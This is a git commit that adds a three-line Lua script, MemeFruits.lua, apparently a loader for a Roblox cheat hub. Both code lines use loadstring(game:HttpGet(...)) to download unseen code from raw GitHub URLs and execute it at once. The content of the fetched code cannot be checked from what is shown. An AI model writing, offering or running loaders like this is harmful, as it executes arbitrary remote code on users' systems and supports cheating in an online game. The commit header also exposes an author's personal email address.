6851894e21cb33353b678736f1cfe9a032e88e1a
YarhmReborn <brandonjaycorro03@gmail.com>
2025-03-01 09:33:03 +0800

    Create MemeFruits.lua

---
+++ MemeFruits.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/me/refs/heads/main/me"))()
+wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YarhmReborn/NSHub/refs/heads/main/Loader.lua"))()
